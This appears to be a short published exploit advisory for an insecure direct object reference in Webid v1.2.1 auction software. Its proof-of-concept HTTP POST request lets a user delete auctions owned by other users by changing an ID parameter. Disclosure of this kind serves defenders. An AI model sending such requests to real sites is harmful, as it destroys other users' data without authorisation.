# Exploit Title: Webid v1.2.1 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://sourceforge.net/projects/simpleauction/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Webid
## Version: v1.2.1
## Exploit Description:
## Webid v1.2.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to delete a suspended auction that is owned by other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /yourauctions_s.php HTTP/1.1
...

csrftoken=e7ea4206644f3113937111c886b52ead&O_delete%5B%5D=5(CHANGE HERE)&action=delopenauctions&Submit=Process+selected+auctions
```